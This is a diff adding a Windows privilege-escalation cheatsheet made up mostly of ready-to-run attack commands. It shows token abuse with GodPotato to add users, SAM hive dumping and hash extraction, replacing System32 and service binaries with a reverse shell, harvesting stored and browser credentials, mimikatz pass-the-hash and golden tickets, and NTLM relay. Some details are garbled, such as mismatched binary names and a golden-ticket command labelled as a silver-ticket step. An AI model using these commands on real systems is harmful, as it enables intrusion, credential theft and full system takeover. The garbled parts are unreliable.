@@ -1,0 +1,109 @@
+# WINDOWS PRIVESC CHEATSHEET (2026)
+# Companion to linux file. Order: enumerate -> tokens -> services -> password reuse -> kernel.
+
+## 1) ENUMERATION (run in this order)
+whoami /all
+whoami /priv
+whoami /groups
+net user
+net localgroup Administrators
+net localgroup "Remote Desktop Users"
+net users %username%
+ipconfig /all
+systeminfo
+wmic qfe list                       # KB list -> OS version mapping
+wmic product get name,version       # installed apps + known exploitable versions
+wmic service list full | findstr /i "pathname"   # service bins
+sc qc <service>                     # check service config
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s
+reg query "HKLM\SYSTEM\CurrentControlSet\Services" /s | findstr /i "ImagePath"
+gpresult /z
+dir /s C:\Users                             # look for config/creds/notes
+dir /s /b C:\*.*key* 2>nul; dir /s C:\*config* 2>nul
+type C:\ProgramData\*.conf 2>nul
+# Tools to drop: winPEAS.exe, Seatbelt.exe, PowerUp.ps1, JAWS / WindowsEnum.ps1, PrivescCheck.ps1
+
+## 2) SEIMPERSONATE / SEASSIGNPRIMETOKEN SERVICE ACCOUNT (most common fast win)
+whoami /priv
+# If SeImpersonatePrivilege is present (typical for service accounts):
+#   2024-2026: use GodPotato (Potato family) - works on .NET / Server 2016-2022:
+#   C:\Temp> GodPotato.exe -cmd "cmd /c whoami"
+#   GodPotato.exe -cmd "net user hacked P@ss123 /add"
+#   Legacy: JuicyPotato (2016-2019), RoguePotato (2019+), PrintSpoofer, SweetPotato
+# Note: PrintSpoofer still lands on plenty of IIS/SQL service accounts.
+
+## 3) SEBACKUP / SERESTORE / SETAKEOWN (backup operator class)
+whoami /priv
+# SeBackupPrivilege -> read any file (e.g. registry SAM):
+reg save hklm\sam sam.hiv
+reg save hklm\system sys.hiv
+reg save hklm\security sec.hiv
+#   recover SYSTEM hash: secretsdump -sam sam.hiv -system sys.hiv LOCAL -ntds
+# SeRestore/SeTakeOwnership -> own the file service bins:
+takeown /f C:\Windows\System32\noteaker.exe /a
+icacls C:\Windows\System32\bleaker.exe /grant Everyone:F
+#   then swap the binary with a reverse shell and restart the service.
+
+## 4) SERVICES
+# Unquoted service path:
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\"
+sc qc <name>        # sees start: "C:\Program Files\My App\app.exe" -> unquoted = hijack
+#   write an executable at C:\Program.exe or C:\Program Files\My.exe, then:
+sc start <name> / restart service (authority to start)
+
+# Weak service permissions (SDDL query):
+sc sdshow <name>
+#   In PowerShell (need local admin-ish or run as user):
+Get-WmiObject win32_service | Select-Object Name,StartName,PathName
+#   ChangeImagePath abuse if user CAN config:
+sc config vuln binpath= "cmd /c whoami > C:\Temp\pwned.txt"
+sc start vuln
+#   Or via reg: HKLM\SYSTEM\CurrentControlSet\Services\<name>\ImagePath
+
+# Service that runs as SYSTEM with mode AUTO and binpath writable = instant win.
+
+## 5) SCHEDULED TASKS
+schtasks /query /fo LIST /v | findstr /i "TaskName Run As" 
+# Look for tasks running as SYSTEM whose actions are writable/reference writable files.
+schtasks /run /tn "Vuln Task"
+#   Autorun registry keys (all users hive):
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+
+## 6) STORED CREDENTIALS
+cmdkey /list
+runas /savecred /user:Administrator cmd.exe        # if saved cred present
+#   browsers: see MasterKey + vault usually locked without session; but check for .txt/.db:
+dir /s C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Login Data 2>nul
+#   Download Mozilla profile (logins.json + key4.db) to crack.
+#   Unattend files:
+findstr /si password *.xml C:\unattend.xml C:\Windows\Panther\* 2>nul
+#   IIS app pools connection strings (web.config)
+#   VNC realvnc settings (HKLM\SOFTWARE\RealVNC), SSH keys in C:\Users\
+
+## 7) KERBEROS AO / PASS-THE-HASH
+# If you hold an NTLM hash (from SAM secretsdump, mimikatz):
+pth-winexe -U admin%'NTLMHASH' //target cmd
+mimikatz "sekurlsa::pth /user:admin /domain:corp /ntlm:HASH"
+#   Golden ticket needs krbtgt AES256; try silver first (service ticket for local admin):
+mimikatz "kerberos::golden /user:admin /domain:corp /sid:S-1-5-21-x /krbtgt:AES256:hash /id:500"
+
+## 8) KERNEL PATCH RELIABILITY (2024-2026 above avg on unpatched boxes)
+# PrintNightmare CVE-2021-34527 (spoolsv) - only when spooler up + easy RCE; verify patchlevel.
+# win32k LPEs vary by OS; check OS build: winver ; systeminfo
+# Impacket ntlmrelayx -> SMB session to admin workstation + add admin user:
+python ntlmrelayx.py -t smb://target -i
+#   ZeroLogon CVE-2020-1472 (only if reset allowed / lab) - resets DC password; use with care.
+
+## 9) UAC + token spoor for standard user (older)
+# UAC trick: silent-elevate self (fodhelper / slui target=...)
+#   only works pre-2022 patch levels; most boxes patched now. Skip unless old.
+
+## 10) ALWAYS CHECK, in this cheap order
+1. whoami /priv (SeImpersonate? GodPotato)
+2. net user *admin* ; cmdkey ; saved creds
+3. services: unquoted path + weak perms
+4. scheduled tasks
+5. unattend.xml / web.config / registry Run keys
+6. C:\Windows\Temp, C:\ProgramData for dropped scripts/configs
+7. Last resort: kernel CVE by OS build
